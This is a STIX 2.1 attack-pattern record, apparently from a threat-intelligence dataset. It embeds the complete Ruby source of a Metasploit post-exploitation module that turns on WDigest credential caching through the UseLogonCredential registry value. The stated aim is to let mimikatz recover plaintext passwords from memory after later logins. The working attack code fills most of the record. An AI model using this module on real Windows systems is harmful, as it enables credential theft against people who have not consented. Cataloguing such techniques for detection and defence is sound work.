{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d87e3e9-998c-4200-99e3-18dc72e03185",
    "created": "2024-08-14T16:33:04.973504Z",
    "modified": "2024-08-14T16:33:04.973508Z",
    "name": "Windows Post Manage WDigest Credential Caching",
    "description": " On Windows 8/2012 or higher, the Digest Security Provider (WDIGEST) is disabled by default. This module enables/disables credential caching by adding/changing the value of the UseLogonCredential DWORD under the WDIGEST provider's Registry key. Any subsequent logins will allow mimikatz to recover the plain text passwords from the system's memory.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/wdigest_caching.rb",
            "external_id": "wdigest_caching.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Version\n\n  WDIGEST_REG_LOCATION = 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest'.freeze\n  USE_LOGON_CREDENTIAL = 'UseLogonCredential'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Post Manage WDigest Credential Caching',\n        'Description' => %q{\n          On Windows 8/2012 or higher, the Digest Security Provider (WDIGEST) is disabled by default. This module enables/disables\n          credential caching by adding/changing the value of the UseLogonCredential DWORD under the WDIGEST provider's Registry key.\n          Any subsequent logins will allow mimikatz to recover the plain text passwords from the system's memory.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('ENABLE', [false, 'Enable the WDigest Credential Cache.', true])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    # Check if OS is 8/2012 or newer. If not, no need to set the registry key\n    # Can be backported to Windows 7, 2k8R2 but defaults to enabled...\n    version = get_version_info\n    if version.build_number < Msf::WindowsVersion::Win7_SP0\n      print_status('Older Windows version detected. No need to enable the WDigest Security Provider. Exiting...')\n    else\n      datastore['ENABLE'] ? wdigest_enable : wdigest_disable\n    end\n  end\n\n  def get_key\n    # Check if the key exists. Not present by default\n    print_status(\"Checking if the #{WDIGEST_REG_LOCATION}\\\\#{USE_LOGON_CREDENTIAL} DWORD exists...\")\n    begin\n      wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)\n      key_exists = !wdvalue.nil?\n\n      print_status(\"#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}\") if key_exists\n      return wdvalue\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Unable to access registry key: #{e}\")\n    end\n  end\n\n  def wdigest_enable\n    wdvalue = get_key\n    key_exists = !wdvalue.nil?\n    # If it is not present, create it\n    if key_exists && wdvalue == 1\n      print_good('Registry value is already set. WDigest Security Provider is enabled')\n    else\n      begin\n        verb = key_exists ? 'Setting' : 'Creating'\n        print_status(\"#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...\")\n        if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')\n          print_good('WDigest Security Provider enabled')\n        else\n          print_error('Unable to access registry key - insufficient privileges?')\n        end\n      rescue Rex::Post::Meterpreter::RequestError => e\n        fail_with(Failure::Unknown, \"Unable to access registry key: #{e}\")\n      end\n    end\n  end\n\n  def wdigest_disable\n    wdvalue = get_key\n    key_exists = !wdvalue.nil?\n    # If it is not present, create it\n    if key_exists && wdvalue == 0\n      print_good('Registry value is already set. WDigest Security Provider is disabled')\n    else\n      begin\n        verb = key_exists ? 'Setting' : 'Creating'\n        print_status(\"#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 0...\")\n        if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 0, 'REG_DWORD')\n          print_good('WDigest Security Provider disabled')\n        else\n          print_error('Unable to access registry key - insufficient privileges?')\n        end\n      rescue Rex::Post::Meterpreter::RequestError => e\n        fail_with(Failure::Unknown, \"Unable to access registry key: #{e}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}